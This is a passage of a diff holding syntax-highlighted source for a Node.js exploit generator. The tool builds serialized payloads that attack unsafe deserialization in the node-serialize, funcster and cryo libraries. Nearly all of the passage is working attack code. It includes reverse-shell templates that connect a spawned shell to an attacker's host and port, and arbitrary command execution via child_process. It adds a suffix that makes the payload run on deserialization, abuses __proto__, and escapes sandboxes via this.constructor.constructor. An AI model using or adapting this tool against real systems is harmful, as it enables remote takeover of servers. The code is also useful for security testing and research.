+    <span class="p">.</span><span class="k">default</span><span class="p">(</span><span class="s1">&#39;s&#39;</span><span class="p">,</span> <span class="s1">&#39;ns&#39;</span><span class="p">)</span>
+    <span class="p">.</span><span class="k">default</span><span class="p">(</span><span class="s1">&#39;m&#39;</span><span class="p">,</span> <span class="s1">&#39;serialize&#39;</span><span class="p">)</span>
+    <span class="p">.</span><span class="nx">describe</span><span class="p">(</span><span class="s1">&#39;f&#39;</span><span class="p">,</span><span class="s1">&#39;Input file&#39;</span><span class="p">)</span>
+    <span class="p">.</span><span class="nx">describe</span><span class="p">(</span><span class="s1">&#39;m&#39;</span><span class="p">,</span><span class="s1">&#39;Operational mode, may be serialize or deserialize&#39;</span><span class="p">)</span>
+    <span class="p">.</span><span class="nx">describe</span><span class="p">(</span><span class="s1">&#39;s&#39;</span><span class="p">,</span><span class="s1">&#39;The serializer module to use&#39;</span><span class="p">)</span>
+    <span class="p">.</span><span class="nx">describe</span><span class="p">(</span><span class="s1">&#39;v&#39;</span><span class="p">,</span><span class="s1">&#39;The vector is command exe or reverse shell&#39;</span><span class="p">)</span>
+    <span class="p">.</span><span class="nx">describe</span><span class="p">(</span><span class="s1">&#39;c&#39;</span><span class="p">,</span><span class="s1">&#39;The command to execute (-v rce must be used)&#39;</span><span class="p">)</span>
+    <span class="p">.</span><span class="nx">describe</span><span class="p">(</span><span class="s1">&#39;e&#39;</span><span class="p">,</span><span class="s1">&#39;Charencode the payload (not implemented yet)&#39;</span><span class="p">)</span>
+    <span class="p">.</span><span class="nx">describe</span><span class="p">(</span><span class="s1">&#39;H&#39;</span><span class="p">,</span><span class="s1">&#39;Local listener IP (-v rshell must be used)&#39;</span><span class="p">)</span>
+    <span class="p">.</span><span class="nx">describe</span><span class="p">(</span><span class="s1">&#39;P&#39;</span><span class="p">,</span><span class="s1">&#39;Local listener PORT (-v rshell must be used)&#39;</span><span class="p">)</span>
+    <span class="p">.</span><span class="nx">describe</span><span class="p">(</span><span class="s1">&#39;t&#39;</span><span class="p">,</span><span class="s1">&#39;Target machine OS, may be Win or Linux&#39;</span><span class="p">)</span>
+    <span class="p">.</span><span class="nx">demandOption</span><span class="p">([</span><span class="s1">&#39;f&#39;</span><span class="p">])</span>
+    <span class="p">.</span><span class="nx">showHelpOnFail</span><span class="p">(</span><span class="kc">false</span><span class="p">,</span> <span class="s2">&quot;Specify --help for available options&quot;</span><span class="p">)</span>
+    <span class="p">.</span><span class="nx">argv</span><span class="p">;</span>
+
+<span class="kd">var</span> <span class="nx">payload</span><span class="p">;</span>
+
+<span class="c1">// Serialize function wrap</span>
+<span class="kd">function</span> <span class="nx">serialize</span><span class="p">(</span><span class="nx">serializer</span><span class="p">,</span> <span class="nx">object</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">serializer</span> <span class="o">==</span> <span class="s2">&quot;fstr&quot;</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">serialize</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;funcster&#39;</span><span class="p">);</span>
+        <span class="k">return</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">serialize</span><span class="p">.</span><span class="nx">deepSerialize</span><span class="p">(</span><span class="nx">object</span><span class="p">),</span><span class="kc">null</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">serializer</span> <span class="o">==</span> <span class="s2">&quot;ns&quot;</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;node-serialize&#39;</span><span class="p">).</span><span class="nx">serialize</span><span class="p">(</span><span class="nx">object</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">argv</span><span class="p">.</span><span class="nx">serializer</span> <span class="o">==</span> <span class="s2">&quot;cryo&quot;</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;cryo&#39;</span><span class="p">).</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">object</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c1">// Deserialize function wrap</span>
+<span class="kd">function</span> <span class="nx">deserialize</span><span class="p">(</span><span class="nx">serializer</span><span class="p">,</span> <span class="nx">object</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">serializer</span> <span class="o">==</span> <span class="s2">&quot;fstr&quot;</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;funcster&#39;</span><span class="p">).</span><span class="nx">deepDeserialize</span><span class="p">(</span><span class="nx">object</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">serializer</span> <span class="o">==</span> <span class="s2">&quot;ns&quot;</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;node-serialize&#39;</span><span class="p">).</span><span class="nx">unserialize</span><span class="p">(</span><span class="nx">object</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">argv</span><span class="p">.</span><span class="nx">serializer</span> <span class="o">==</span> <span class="s2">&quot;cryo&quot;</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;cryo&#39;</span><span class="p">).</span><span class="nx">parse</span><span class="p">(</span><span class="nx">object</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="cm">/* As dynamic commands couldn&#39;t be added during serialization,</span>
+<span class="cm">*  these tags were applied to payload templates to allow dynamic</span>
+<span class="cm">*  configuration </span>
+<span class="cm">*/</span>
+<span class="nx">cmd_tag</span> <span class="o">=</span> <span class="sr">/####COMMAND####/g</span><span class="p">;</span>
+<span class="nx">lhost_tag</span> <span class="o">=</span> <span class="sr">/####LHOST####/g</span><span class="p">;</span>
+<span class="nx">lport_tag</span> <span class="o">=</span> <span class="sr">/####LPORT####/g</span><span class="p">;</span>
+<span class="nx">shell_tag</span> <span class="o">=</span> <span class="sr">/####SHELL####/g</span><span class="p">;</span>
+<span class="nx">sentinel_tag</span> <span class="o">=</span> <span class="sr">/\/\/####SENTINEL####\s*}/g</span><span class="p">;</span>
+<span class="nx">proto_tag</span><span class="o">=</span><span class="sr">/function_prototype/g</span><span class="p">;</span>
+
+<span class="c1">//BEGIN - Payload Template Generation</span>
+<span class="k">if</span> <span class="p">(</span><span class="nx">argv</span><span class="p">.</span><span class="nx">vector</span> <span class="o">==</span> <span class="s2">&quot;rshell&quot;</span> <span class="o">&amp;&amp;</span> <span class="nx">argv</span><span class="p">.</span><span class="nx">serializer</span> <span class="o">!=</span> <span class="s2">&quot;cryo&quot;</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">argv</span><span class="p">.</span><span class="nx">lport</span> <span class="o">==</span> <span class="s1">&#39;undefined&#39;</span> <span class="o">||</span> <span class="k">typeof</span> <span class="nx">argv</span><span class="p">.</span><span class="nx">lhost</span> <span class="o">==</span> <span class="s1">&#39;undefined&#39;</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;[-] RShell vector requires LHOST and LPORT to be specified&quot;</span><span class="p">);</span>
+        <span class="nx">process</span><span class="p">.</span><span class="nx">exit</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="nx">payload</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="nx">rce</span><span class="o">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+            <span class="kd">var</span> <span class="nx">net</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;net&#39;</span><span class="p">);</span>
+            <span class="kd">var</span> <span class="nx">spawn</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">spawn</span><span class="p">;</span>
+            <span class="nx">HOST</span> <span class="o">=</span> <span class="s2">&quot;####LHOST####&quot;</span><span class="p">;</span>
+            <span class="nx">PORT</span> <span class="o">=</span> <span class="s2">&quot;####LPORT####&quot;</span><span class="p">;</span>
+            <span class="nx">TIMEOUT</span> <span class="o">=</span> <span class="s2">&quot;5000&quot;</span><span class="p">;</span>
+            <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nb">String</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">contains</span> <span class="o">===</span> <span class="s1">&#39;undefined&#39;</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nb">String</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">contains</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">it</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">it</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+                <span class="p">};</span>
+            <span class="p">}</span>
+
+            <span class="kd">function</span> <span class="nx">c</span><span class="p">(</span><span class="nx">HOST</span><span class="p">,</span> <span class="nx">PORT</span><span class="p">)</span> <span class="p">{</span>
+                <span class="kd">var</span> <span class="nx">client</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">net</span><span class="p">.</span><span class="nx">Socket</span><span class="p">();</span>
+                <span class="nx">client</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="nx">PORT</span><span class="p">,</span> <span class="nx">HOST</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+                    <span class="kd">var</span> <span class="nx">sh</span> <span class="o">=</span> <span class="nx">spawn</span><span class="p">(</span><span class="s2">&quot;####SHELL####&quot;</span><span class="p">,</span> <span class="p">[]);</span>
+                    <span class="nx">client</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&quot;Connected!&quot;</span><span class="p">);</span>
+                    <span class="nx">client</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">sh</span><span class="p">.</span><span class="nx">stdin</span><span class="p">);</span>
+                    <span class="nx">sh</span><span class="p">.</span><span class="nx">stdout</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span>
+                    <span class="nx">sh</span><span class="p">.</span><span class="nx">stderr</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span>
+                    <span class="nx">sh</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;exit&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">code</span><span class="p">,</span> <span class="nx">signal</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="nx">client</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="s2">&quot;Disconnected!&quot;</span><span class="p">);</span>
+                    <span class="p">});</span>
+                <span class="p">});</span>
+                <span class="nx">client</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;error&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="nx">setTimeout</span><span class="p">(</span><span class="nx">c</span><span class="p">(</span><span class="nx">HOST</span><span class="p">,</span> <span class="nx">PORT</span><span class="p">),</span> <span class="nx">TIMEOUT</span><span class="p">);</span>
+                <span class="p">});</span>
+            <span class="p">}</span>
+            <span class="nx">c</span><span class="p">(</span><span class="nx">HOST</span><span class="p">,</span> <span class="nx">PORT</span><span class="p">);</span><span class="c1">//####SENTINEL####</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">argv</span><span class="p">.</span><span class="nx">vector</span> <span class="o">==</span> <span class="s2">&quot;rshell&quot;</span> <span class="o">&amp;&amp;</span> <span class="nx">argv</span><span class="p">.</span><span class="nx">serializer</span> <span class="o">==</span> <span class="s2">&quot;cryo&quot;</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">argv</span><span class="p">.</span><span class="nx">lport</span> <span class="o">==</span> <span class="s1">&#39;undefined&#39;</span> <span class="o">||</span> <span class="k">typeof</span> <span class="nx">argv</span><span class="p">.</span><span class="nx">lhost</span> <span class="o">==</span> <span class="s1">&#39;undefined&#39;</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;[-] RShell vector requires LHOST and LPORT to be specified&quot;</span><span class="p">);</span>
+        <span class="nx">process</span><span class="p">.</span><span class="nx">exit</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="nx">payload</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="nx">__proto</span><span class="o">:</span> <span class="p">{</span>
+            <span class="nx">function_prototype</span><span class="o">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+                <span class="kd">var</span> <span class="nx">net</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;net&#39;</span><span class="p">);</span>
+                <span class="kd">var</span> <span class="nx">spawn</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">spawn</span><span class="p">;</span>
+                <span class="nx">HOST</span> <span class="o">=</span> <span class="s2">&quot;####LHOST####&quot;</span><span class="p">;</span>
+                <span class="nx">PORT</span> <span class="o">=</span> <span class="s2">&quot;####LPORT####&quot;</span><span class="p">;</span>
+                <span class="nx">TIMEOUT</span> <span class="o">=</span> <span class="s2">&quot;5000&quot;</span><span class="p">;</span>
+                <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nb">String</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">contains</span> <span class="o">===</span> <span class="s1">&#39;undefined&#39;</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="nb">String</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">contains</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">it</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">it</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+                    <span class="p">};</span>
+                <span class="p">}</span>
+
+                <span class="kd">function</span> <span class="nx">c</span><span class="p">(</span><span class="nx">HOST</span><span class="p">,</span> <span class="nx">PORT</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="kd">var</span> <span class="nx">client</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">net</span><span class="p">.</span><span class="nx">Socket</span><span class="p">();</span>
+                    <span class="nx">client</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="nx">PORT</span><span class="p">,</span> <span class="nx">HOST</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+                        <span class="kd">var</span> <span class="nx">sh</span> <span class="o">=</span> <span class="nx">spawn</span><span class="p">(</span><span class="s1">&#39;####SHELL####&#39;</span><span class="p">,</span> <span class="p">[]);</span>
+                        <span class="nx">client</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&quot;Connected!&quot;</span><span class="p">);</span>
+                        <span class="nx">client</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">sh</span><span class="p">.</span><span class="nx">stdin</span><span class="p">);</span>
+                        <span class="nx">sh</span><span class="p">.</span><span class="nx">stdout</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span>
+                        <span class="nx">sh</span><span class="p">.</span><span class="nx">stderr</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span>
+                        <span class="nx">sh</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;exit&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">code</span><span class="p">,</span> <span class="nx">signal</span><span class="p">)</span> <span class="p">{</span>
+                            <span class="nx">client</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="s2">&quot;Disconnected!&quot;</span><span class="p">);</span>
+                        <span class="p">});</span>
+                    <span class="p">});</span>
+                    <span class="nx">client</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;error&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="nx">setTimeout</span><span class="p">(</span><span class="nx">c</span><span class="p">(</span><span class="nx">HOST</span><span class="p">,</span> <span class="nx">PORT</span><span class="p">),</span> <span class="nx">TIMEOUT</span><span class="p">);</span>
+                    <span class="p">});</span>
+                <span class="p">}</span>
+                <span class="nx">c</span><span class="p">(</span><span class="nx">HOST</span><span class="p">,</span> <span class="nx">PORT</span><span class="p">);</span> <span class="c1">//####SENTINEL####</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">argv</span><span class="p">.</span><span class="nx">vector</span> <span class="o">==</span> <span class="s2">&quot;rce&quot;</span> <span class="o">&amp;&amp;</span> <span class="nx">argv</span><span class="p">.</span><span class="nx">serializer</span> <span class="o">!=</span> <span class="s2">&quot;cryo&quot;</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">argv</span><span class="p">.</span><span class="nx">command</span> <span class="o">==</span> <span class="s1">&#39;undefined&#39;</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;[-] RCE vector requires a command to be specified&quot;</span><span class="p">);</span>
+        <span class="nx">process</span><span class="p">.</span><span class="nx">exit</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="nx">payload</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="nx">rce</span><span class="o">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+            <span class="nx">CMD</span> <span class="o">=</span> <span class="s2">&quot;####COMMAND####&quot;</span><span class="p">;</span>
+            <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="nx">CMD</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">error</span><span class="p">,</span> <span class="nx">stdout</span><span class="p">,</span> <span class="nx">stderr</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">stdout</span><span class="p">)</span>
+            <span class="p">});</span> <span class="c1">//####SENTINEL####</span>
+        <span class="p">},</span>
+    <span class="p">}</span>
+<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">argv</span><span class="p">.</span><span class="nx">vector</span> <span class="o">==</span> <span class="s2">&quot;rce&quot;</span> <span class="o">&amp;&amp;</span> <span class="nx">argv</span><span class="p">.</span><span class="nx">serializer</span> <span class="o">==</span> <span class="s2">&quot;cryo&quot;</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">argv</span><span class="p">.</span><span class="nx">command</span> <span class="o">==</span> <span class="s1">&#39;undefined&#39;</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;[-] RCE vector requires a command to be specified&quot;</span><span class="p">);</span>
+        <span class="nx">process</span><span class="p">.</span><span class="nx">exit</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="nx">payload</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="nx">__proto</span><span class="o">:</span> <span class="p">{</span>
+            <span class="nx">function_prototype</span><span class="o">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+                <span class="nx">CMD</span> <span class="o">=</span> <span class="s2">&quot;####COMMAND####&quot;</span><span class="p">;</span>
+                <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="nx">CMD</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">error</span><span class="p">,</span> <span class="nx">stdout</span><span class="p">,</span> <span class="nx">stderr</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">stdout</span><span class="p">)</span>
+                <span class="p">});</span> <span class="c1">//####SENTINEL####</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="nx">payload</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="nx">rce</span><span class="o">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+            <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="s1">&#39;cmd /c calc&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">error</span><span class="p">,</span> <span class="nx">stdout</span><span class="p">,</span> <span class="nx">stderr</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">stdout</span><span class="p">)</span>
+            <span class="p">});</span> <span class="c1">//####SENTINEL####</span>
+        <span class="p">},</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="c1">//END - Payload Template Generation</span>
+
+<span class="c1">//BEGIN - Payload Customization</span>
+<span class="k">if</span> <span class="p">(</span><span class="nx">argv</span><span class="p">.</span><span class="nx">mode</span> <span class="o">==</span> <span class="s2">&quot;serialize&quot;</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">serialized_object</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nx">argv</span><span class="p">.</span><span class="nx">serializer</span><span class="p">,</span> <span class="nx">payload</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">argv</span><span class="p">.</span><span class="nx">serializer</span> <span class="o">==</span> <span class="s2">&quot;cryo&quot;</span><span class="p">)</span> <span class="p">{</span>
+        <span class="c1">// Prototype rewriting</span>
+        <span class="nx">serialized_object</span> <span class="o">=</span> <span class="nx">serialized_object</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="s2">&quot;__proto&quot;</span><span class="p">,</span> <span class="s2">&quot;__proto__&quot;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="c1">// Beautify</span>
+    <span class="nx">serialized_object</span> <span class="o">=</span> <span class="nx">serialized_object</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/(\\t|\\n)/gmi</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">);</span>
+    <span class="nx">serialized_object</span> <span class="o">=</span> <span class="nx">serialized_object</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/(\s+)/gmi</span><span class="p">,</span><span class="s2">&quot; &quot;</span><span class="p">);</span>
+    <span class="c1">// Setting up CMD (if applicable)</span>
+    <span class="nx">serialized_object</span> <span class="o">=</span> <span class="nx">serialized_object</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="nx">cmd_tag</span><span class="p">,</span> <span class="nx">argv</span><span class="p">.</span><span class="nx">command</span><span class="p">);</span>
+    <span class="c1">// Setting up RSHELL (if applicable)</span>
+    <span class="nx">serialized_object</span> <span class="o">=</span> <span class="nx">serialized_object</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="nx">lhost_tag</span><span class="p">,</span> <span class="nx">argv</span><span class="p">.</span><span class="nx">lhost</span><span class="p">);</span>
+    <span class="nx">serialized_object</span> <span class="o">=</span> <span class="nx">serialized_object</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="nx">lport_tag</span><span class="p">,</span> <span class="nx">argv</span><span class="p">.</span><span class="nx">lport</span><span class="p">);</span>
+    <span class="c1">// Setting up shell basing on OS</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">argv</span><span class="p">.</span><span class="nx">target</span> <span class="o">==</span> <span class="s2">&quot;windows&quot;</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">serialized_object</span> <span class="o">=</span> <span class="nx">serialized_object</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="nx">shell_tag</span><span class="p">,</span> <span class="s2">&quot;cmd&quot;</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">argv</span><span class="p">.</span><span class="nx">target</span> <span class="o">==</span> <span class="s2">&quot;linux&quot;</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">serialized_object</span> <span class="o">=</span> <span class="nx">serialized_object</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="nx">shell_tag</span><span class="p">,</span> <span class="s2">&quot;/bin/sh&quot;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="c1">// Making payload executable with &quot;()&quot;</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">serialized_object</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&quot;####SENTINEL####&quot;</span><span class="p">)){</span>
+        <span class="nx">serialized_object</span> <span class="o">=</span> <span class="nx">serialized_object</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="nx">sentinel_tag</span><span class="p">,</span> <span class="s1">&#39;}()&#39;</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nx">serialized_object</span> <span class="o">=</span> <span class="nx">serialized_object</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="s1">&#39;&quot;}}&#39;</span><span class="p">,</span> <span class="s1">&#39;()&quot;}}&#39;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">argv</span><span class="p">.</span><span class="nx">serializer</span> <span class="o">==</span> <span class="s2">&quot;fstr&quot;</span> <span class="o">||</span> <span class="nx">argv</span><span class="p">.</span><span class="nx">serializer</span> <span class="o">==</span> <span class="s2">&quot;cryo&quot;</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="nx">argv</span><span class="p">.</span><span class="nx">serializer</span> <span class="o">==</span> <span class="s2">&quot;cryo&quot;</span><span class="p">){</span>
+            <span class="nx">serialized_object</span> <span class="o">=</span> <span class="nx">serialized_object</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="nx">proto_tag</span><span class="p">,</span> <span class="nx">argv</span><span class="p">.</span><span class="nx">cryoprototype</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">argv</span><span class="p">.</span><span class="nx">vector</span> <span class="o">==</span> <span class="s2">&quot;rce&quot;</span><span class="p">)</span> <span class="p">{</span>
+            <span class="c1">// Modifying RCE payload to bypass the sandbox via this.constructor.constructor</span>
+            <span class="nx">serialized_object</span> <span class="o">=</span> <span class="nx">serialized_object</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="s2">&quot;require(&#39;child_process&#39;)&quot;</span><span class="p">,</span> <span class="s2">&quot;const process = this.constructor.constructor(&#39;return this.process&#39;)();process.mainModule.require(&#39;child_process&#39;)&quot;</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">argv</span><span class="p">.</span><span class="nx">vector</span> <span class="o">==</span> <span class="s2">&quot;rshell&quot;</span><span class="p">)</span> <span class="p">{</span>
+            <span class="c1">// Modifying RSHELL payload to bypass the sandbox via this.constructor.constructor</span>
+            <span class="nx">serialized_object</span> <span class="o">=</span> <span class="nx">serialized_object</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="s2">&quot;var net=require(&#39;net&#39;);var spawn=require(&#39;child_process&#39;).spawn;&quot;</span><span class="p">,</span> <span class="s2">&quot;const process = this.constructor.constructor(&#39;return this.process&#39;)();var spawn=process.mainModule.require(&#39;child_process&#39;).spawn;var net=process.mainModule.require(&#39;net&#39;);&quot;</span><span class="p">);</span>
+            <span class="nx">serialized_object</span> <span class="o">=</span> <span class="nx">serialized_object</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="s2">&quot;var net = require(&#39;net&#39;);var spawn = require(&#39;child_process&#39;).spawn;&quot;</span><span class="p">,</span> <span class="s2">&quot;const process = this.constructor.constructor(&#39;return this.process&#39;)();var spawn=process.mainModule.require(&#39;child_process&#39;).spawn;var net=process.mainModule.require(&#39;net&#39;);&quot;</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="c1">// Debug check</span>
